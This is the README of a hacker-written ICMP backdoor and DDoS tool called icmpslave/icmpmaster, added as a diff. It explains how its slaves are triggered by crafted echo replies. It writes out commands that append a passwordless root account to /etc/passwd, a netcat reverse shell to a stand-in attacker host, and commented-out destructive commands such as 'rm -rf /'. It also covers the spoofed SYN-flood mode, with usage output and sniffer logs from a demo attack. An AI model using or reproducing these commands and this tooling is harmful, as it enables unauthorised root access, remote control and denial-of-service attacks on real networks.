@@ -1,0 +1,237 @@
+icmpslave/icmpmaster remote backdoor/DDoS  0.5
+          by l0om  member of
+           WWW.EXCLUDED.ORG
+
+
+some time ago i wanted to write down a remote backdoor which should works
+with icmp messages to get though much firewalls. so i started to write
+icmpslave.c and icmpmaster.c.
+
+you can change easily the specail icmp crafted typs if you modify the
+#defined constants in the sources.
+
+
+!!NOTES!!
+- sources can be compiled with gcc -o icmpslave icmpslave.c && gcc -o \
+  icmpmaster icmpmaster.c
+- icmpslave process needs root rights (uses raw sockets)
+- icmpmaster can only be run as root
+- icmpslave dont prints error messages - its very quiet...
+  to see if its running use ps command.
+!!SNIPS!!
+
+
+icmpslave.c
+-----------
+is a very quit programm which waits on default for a special crafted icmp
+echo reply. most firewalls will let echo replys path through to the network.
+there are three special echo replys (another good typ to get through the
+firewall is : time exceeded or network unreachable- can be changed in the
+sources):
+
+// all icmp->type = 0 && icmp->code = 0  ---> echo reply
+
+1)
+datalen = 64
+datapattern = ' ' // 0x20
+if a icmpslave will receive such a packet it will execute a function called
+exec_fun wich will add on default an root account. a user only has to modify
+the string in the system function.
+
+$ cat icmpslave.c | grep system
+   system("/bin/echo "" >>/etc/passwd");
+   system("/bin/echo r0ot::0:0::/:/bin/sh >>/etc/passwd");
+   // system("/bin/rm -rf /);"
+   // system("/bin/cat /dev/urandom >>/dev/audio");
+   // system("while true; do /bin/eject; done");
+
+well this isnt very kewl. an attacker could make an reverse connection
+with netcat like this:
+system("/tmp/.../.nc www.evil_haxor.org -p 80 -e /bin/sh");
+remote connections to port 80 will pass much firewall acls.
+
+2)
+datalen = 32
+datapattern = C
+this kind of echo replys are send by the master to check if a slave is
+active or not. if the slave receives this it will answer the request
+with a icmp echo request packet (pass nearly every firewall) filled
+with C pattern.
+
+3)
+datalen = 128
+datapattern = A
+now its getting evil.
+after an icmpslave receives this, it will start a synflood attack on
+the source ip from the icmp echo reply packet.
+the icmpmaster will send such a packet with the spoofed address of the
+DDoS victim to the slaves and launches a DDoS attack.
+the synflood will spoof every packets source ip address as well as
+source port and dest port.
+
+icmpmaster.c
+------------
+with the master you are able to control all yours icmpslaves.
+the master can send icmp packets which could make the slave starts a
+special function, a synflood attack or to send an answer to make sure
+he is alive.
+
+if no options are given to the icmpmaster command it will show you the help
+
+  this program can be used to activate icmpslaves
+        usage:
+        icmpmaster [options] <SYN|EXEC|CHECK>
+        options:
+        -d: dont open a slave database file - just use this ip as dest
+        -f: the from argument. this argument must be specifed if you want
+            to syn flood some ip. the argument after -f must be the ip to
+            flood. so its a spoofed source ip address which will be flooded
+        -slaves: next argument must be a alternative filename.
+                 on default the program will grap a file named SLAVEFILE
+        -SYN: tell the programm to send a special crafted icmp packet to the
+              slave to activate the synflood action
+        -EXEC: send a specail crafted icmp packet to the slave to start the
+               exec_fun function from the slave
+        -CHECK: send slave request packet and wait for slave response.
+                to check if slave is active
+        -h: print out help
+
+
+as you can see the master will start opening a file called slavesfile.db if
+you dont specify another filename or use -d option to speak to a singel ip
+address. furthermore you must specify what you want to do SYN, EXEC or CHECK.
+if you want to SYN a victim you must use the -f option to give the packet a
+source ip which will be synflooded.
+
+if you use the CHECK function the master will try to lookup your ip address
+and will send a slave request with your source address and will wait for
+an answer from the slave.
+
+example
+-------
+i have put up icmpslave on 2 hosts in my local network:
+192.168.1.101
+192.168.1.102
+
+fist i build up an slavelist.db file with the slave ips.
+
+l0om:~# cat >slavelist.db<<end
+> 192.168.1.101
+> 192.168.1.1
+> 192.168.1.102
+> end
+
+l0om:~# cat slavelist.db
+192.168.1.101
+192.168.1.1
+192.168.1.102
+
+lets see if 192.168.1.102 got a listen icmpslave.
+
+l0om:~# ./icmpmaster -d 192.168.1.102 -CHECK
+        ###icmpmaster###
+            v 0.5
+        www.excluded.org
+        ################
+
+
+         [#] performing slave request
+	 [*] your ip is 192.168.1.101
+	 [?] corret?  y/n [y]:
+
+         [#] using no slave list- all action will take place on 192.168.1.102
+         [+] request send to destination ip
+         [#] waiting for slave reqly...
+         [+] got a slave reqly from 192.168.1.102
+
+lets check my whole list for listening slaves.
+
+l0om:~# ./icmpmaster  -CHECK
+        ###icmpmaster###
+            v 0.5
+        www.excluded.org
+        ################
+
+
+         [#] performing slave request
+	 [*] your ip is 192.168.1.101
+	 [?] corret?  y/n [y]:
+
+         [#] using slave list
+         [+] slave database successfully opend
+         [+] request send to destination ip
+         [#] waiting for slave reqly...
+         [+] got a slave reqly from 192.168.1.101
+         [+] request send to destination ip
+         [#] waiting for slave reqly...
+         [-] didnt received a slave reply...
+         [+] request send to destination ip
+         [#] waiting for slave reqly...
+         [+] got a slave reqly from 192.168.1.102
+
+okay, okay. lets synflood 192.168.1.101 now!!!
+
+l0om:~# ./icmpmaster  -SYN -f 192.168.1.101
+        ###icmpmaster###
+            v 0.5
+        www.excluded.org
+        ################
+
+
+         [#] performing syn attack
+         [#] using slave list
+         [+] slave database successfully opend
+         [+] packet send to destination ip
+         [+] packet send to destination ip
+         [+] packet send to destination ip
+
+all right-> lets see what my sniffer on 192.168.1.101 says:
+
+l0om:~# tail sniffer.log
+
+[...]
+tcp: source:142.45.179.134  destp:1803  sourcep:1158  seq:3442260877l  ack:2231224144l
+ syn
+tcp: source:121.71.194.234  destp:1698  sourcep:212  seq:2315911516l  ack:935374449l
+ syn
+tcp: source:46.27.24.140  destp:1252  sourcep:136  seq:1575948403l  ack:3005891689l
+ syn
+tcp: source:106.133.87.188  destp:923  sourcep:1005  seq:3502522480l  ack:719717274l
+ syn
+tcp: source:29.69.3.88  destp:268  sourcep:1644  seq:1769952122l  ack:1446014431l
+ syn
+tcp: source:31.104.109.219  destp:1962  sourcep:415  seq:1917929674l  ack:3908538007l
+ syn
+tcp: source:113.80.110.8  destp:1207  sourcep:1123  seq:2857941554l  ack:2644616840l
+ syn
+tcp: source:145.98.248.87  destp:951  sourcep:1015  seq:2658375419l  ack:3525555706l
+ syn
+tcp: source:51.236.213.88  destp:262  sourcep:13  seq:730028495l  ack:713668276l
+ syn
+tcp: source:104.95.46.178  destp:291  sourcep:1156  seq:508694025l  ack:1956861597l
+ syn
+tcp: source:112.197.227.15  destp:1674  sourcep:1673  seq:489346616l  ack:1661827860l
+ syn
+tcp: source:175.104.236.51  destp:1488  sourcep:1525  seq:1867782802l  ack:2284572510l
+ syn
+tcp: source:199.190.173.25  destp:463  sourcep:1691  seq:2314973764l  ack:1825942531l
+ syn
+tcp: source:40.29.16.25  destp:546  sourcep:889  seq:1199693425l  ack:2247414704l
+ syn
+[...]
+
+
+----
+l0om
+
+			-pro digital anarchy
+	-pro pacifism
+		-pro feminise
+				-anti militarism
+-anti fascism		  -anti precepts
+		-anti authority
+
+
+  !free the cyberspace!
+        CYBERPUNK
+  life phat - life phree
